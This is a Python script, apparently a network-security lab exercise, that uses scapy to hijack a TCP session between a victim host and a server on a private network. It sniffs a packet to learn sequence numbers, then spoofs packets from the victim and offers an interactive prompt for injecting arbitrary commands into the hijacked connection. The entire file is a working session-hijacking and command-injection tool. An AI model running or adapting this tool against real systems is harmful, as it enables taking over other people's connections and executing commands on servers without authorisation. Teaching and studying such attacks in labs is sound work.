from scapy.all import *

VICTIM_IP='192.168.101.10'
SERVER_IP='192.168.101.30'

src = VICTIM_IP
dst = SERVER_IP
seq = 0
ack = 0
sport = 0
dport = 1234

hijacked = False

def stop_sniff(pkt):
    global hijacked
    return hijacked

def show_pkt(pkt):
    global seq, ack, sport, dport, hijacked

    if pkt[TCP].flags != 'A':
        return

    if pkt[IP].src != SERVER_IP or pkt[IP].dst != VICTIM_IP:
        return

    if pkt[TCP].sport != 1234:
        return

    seq = pkt[TCP].ack
    ack = pkt[TCP].seq
    sport = pkt[TCP].dport

    send_spoof_tcp(b"\n!!! Connection Hijacked !!!\n\r")
    hijacked=True

def send_spoof_tcp(command):
    global seq, ack, sport, dport, hijacked

    # Exercise 1.
    # Fill the and IP, TCP layers accordingly to the algorithm we discussed
    # Tip 1: How should the flag field be?
    ip = IP(src=src, dst=dst)
    tcp = TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags='PA')
    data = command
    pkt = sr1(ip / tcp / data, verbose=False)
    seq = pkt[TCP].ack

    if pkt[TCP].flags == "A":
        ack = pkt[TCP].seq
        seq = pkt[TCP].ack

def command_inject():
    while True:
        try:
            cmd = input("inject> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            sys.exit(0)
        if not cmd:
            continue
        if cmd.lower() == "exit":
            print("[*] Exiting.")
            sys.exit(0)
        send_spoof_tcp(cmd + '\n')

if __name__ == "__main__":
    print("----------------------")
    sniff(filter="tcp",
      iface="eth0",
      prn=show_pkt,
      stop_filter=stop_sniff
      )
    command_inject()
